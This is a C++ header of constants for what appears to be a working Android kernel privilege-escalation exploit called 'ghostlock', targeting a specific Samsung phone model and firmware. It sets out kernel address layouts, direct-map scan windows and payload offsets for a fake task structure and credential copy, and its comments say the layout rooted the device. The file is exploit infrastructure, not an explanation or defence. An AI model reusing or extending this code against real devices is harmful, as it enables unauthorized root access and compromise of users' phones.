#ifndef GHOSTLOCK_TARGET_CONSTANTS_HPP
#define GHOSTLOCK_TARGET_CONSTANTS_HPP

#include <cstddef>
#include <cstdint>
#include <limits>
#include <optional>
#include <type_traits>

namespace ghostlock::target {
    namespace address {
        /* Address layout selector.
         *
         * The default is the VA_BITS=48 GKI layout that every existing device
         * profile targets. Defining GHOSTLOCK_TARGET_A53_5_10 at build time
         * selects the VA_BITS=39 android12-5.10 layout instead, which is what
         * SM-A536E / A536EXXSMGZE2 runs.
         *
         * This is a *build-time* switch on purpose: kImageTextBase feeds a
         * constexpr chain (INIT_TASK, INIT_CRED, ...) that is baked into the
         * attack functions, so the layout cannot vary at runtime without
         * turning those into runtime reads across the whole attack surface.
         * One build per kernel family keeps the default path byte-identical.
         *
         * Only kImageTextBase and kPageOffset are correctness-critical here --
         * a wrong value makes address resolution produce garbage and the run
         * dies before touching the kernel. The remaining entries are bounds
         * tunables for the KernelSnitch scan, which only affect how much of
         * the direct map gets searched. */
#if defined(GHOSTLOCK_TARGET_A53_5_10)

        /* _text measured from the shipped boot image header, not assumed. */
        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc008000000ULL;
        /* Physmap family, taken from the layout that actually rooted this
         * device (see docs/analysis/device-gates/ROOT-A536EXXSMGZE2-01.md).
         *
         * These were previously rebased onto a VA_BITS=39 page offset of
         * 0xffffffc000000000, inferred from /proc/config.gz. That inference is
         * wrong: the working run resolved mm_struct slabs at 0xffffff80......
         * and 0xffffff88...... on this exact hardware and wrote through them
         * successfully. Samsung ships a config.gz that does not match the
         * running kernel build, so the device uses the VA48-style linear map
         * at 0xffffff8000000000 while the kernel image still sits at
         * 0xffffffc000000000. Trusting config.gz over the observed run
         * pointed every scan at unmapped memory. */
        inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
        /* Upper bound only. apply_iomem_cache narrows this from a rooted
         * /proc/iomem dump, and its "reject a span >= DIRECT_MAP_END - BASE"
         * guard means this value also has to exceed real DRAM. */
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
        /* physmap_info -- the array of mm_struct pointers the scan hunts for --
         * is not contiguous in the direct map. The Exynos 1280 layout exposes
         * it through two aliases: a low window at the page offset, and a high
         * one 512 GiB above it. Bounds match the layout that rooted the
         * device: low 2 GiB, high 512 GiB.
         *
         * Scanning only the low window never finds the pointers, and a single
         * contiguous range spanning both would sweep 512 GiB of unrelated
         * memory. */
        inline constexpr std::uintptr_t kIdentityWindow0Start = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kIdentityWindow0End = 0xffffff8080000000ULL;
        inline constexpr std::uintptr_t kIdentityWindow1Start = 0xffffff8800000000ULL;
        inline constexpr std::uintptr_t kIdentityWindow1End = 0xffffff8980000000ULL;
        inline constexpr std::size_t kIdentityWindowCount = 2;
        /* Retained for callers that treat the scan as a single range. */
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                kIdentityWindow0Start;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd = kIdentityWindow0End;
        /* Unused by the attack path; retained so the layout stays complete.
         * Derived as linear-map base minus the 64 GiB physmap window, and not
         * verified on device. */
        inline constexpr std::uintptr_t kVmemmapStart = 0xffffff7ff0000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;

#else

        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc080000000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        /* This family's physmap is contiguous, so one window covers it. The
         * second slot repeats the first and is never scanned: the count below
         * is what limits the loop, which keeps the array shape identical across
         * families and out of the preprocessor. */
        inline constexpr std::uintptr_t kIdentityWindow0Start = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kIdentityWindow0End = 0xffffff8c00000000ULL;
        inline constexpr std::uintptr_t kIdentityWindow1Start = kIdentityWindow0Start;
        inline constexpr std::uintptr_t kIdentityWindow1End = kIdentityWindow0End;
        inline constexpr std::size_t kIdentityWindowCount = 1;
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                kIdentityWindow0Start;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd = kIdentityWindow0End;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
        inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;
#endif
    } // namespace address

    namespace payload {
        inline constexpr std::size_t kLockOffset = 0x0e80;
        inline constexpr std::size_t kWaiterOffset = 0x1180;
        inline constexpr std::size_t kFileOperationsOffset = 0x0f80;
        inline constexpr std::size_t kRightNodeOffset = 0x1240;
        inline constexpr std::size_t kLeftNodeOffset = 0x1260;
        inline constexpr std::size_t kFakeTaskOffset = 0x1280;
        inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
        inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
        inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
    } // namespace payload

    template<typename Domain>
    class KernelAddress final {
    public:
        constexpr KernelAddress() noexcept = default;

        explicit constexpr KernelAddress(std::uintptr_t value) noexcept
            : value_(value) {
        }

        [[nodiscard]] constexpr std::uintptr_t value() const noexcept {
            return value_;
        }

        [[nodiscard]] constexpr std::optional<KernelAddress> checked_add(
            std::uintptr_t offset) const noexcept {
            if (offset > std::numeric_limits<std::uintptr_t>::max() - value_) {
                return std::nullopt;
            }
            return KernelAddress(value_ + offset);
        }

        friend constexpr bool operator==(KernelAddress, KernelAddress) = default;

    private:
        std::uintptr_t value_ = 0;
    };

    struct ImageAddressDomain final {
    };

    struct DirectMapAddressDomain final {
    };

    struct PhysicalAddressDomain final {
    };

    static_assert(std::is_standard_layout_v<KernelAddress<ImageAddressDomain> >);
    static_assert(std::is_trivially_copyable_v<KernelAddress<ImageAddressDomain> >);
    static_assert(sizeof(KernelAddress<ImageAddressDomain>) == sizeof(std::uintptr_t));
    static_assert(alignof(KernelAddress<ImageAddressDomain>) == alignof(std::uintptr_t));

    /* The 6.12 pins only describe the default layout. Under a family switch the
     * corresponding assertions come from that branch instead, so a build can
     * never silently carry a mix of the two layouts. */
#if defined(GHOSTLOCK_TARGET_A53_5_10)
    static_assert(address::kImageTextBase == 0xffffffc008000000ULL);
    static_assert(address::kPageOffset == 0xffffff8000000000ULL);
#else
    static_assert(address::kImageTextBase == 0xffffffc080000000ULL);
    static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
#endif

    /* Layout-relative invariants. These must hold in every family. */
    static_assert(address::kPageOffset == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityEnd < address::kDirectMapEnd);
    static_assert(payload::kLockOffset == 0x0e80);
    static_assert(payload::kFileOperationsOffset == 0x0f80);
    static_assert(payload::kCredentialCopyOffset == 0x1080);
    static_assert(payload::kWaiterOffset == 0x1180);
    static_assert(payload::kRightNodeOffset == 0x1240);
    static_assert(payload::kLeftNodeOffset == 0x1260);
    static_assert(payload::kFakeTaskOffset == 0x1280);
    static_assert(payload::kTcpFakeTaskOffset == 0x5800);
    static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
} // namespace ghostlock::target

#endif
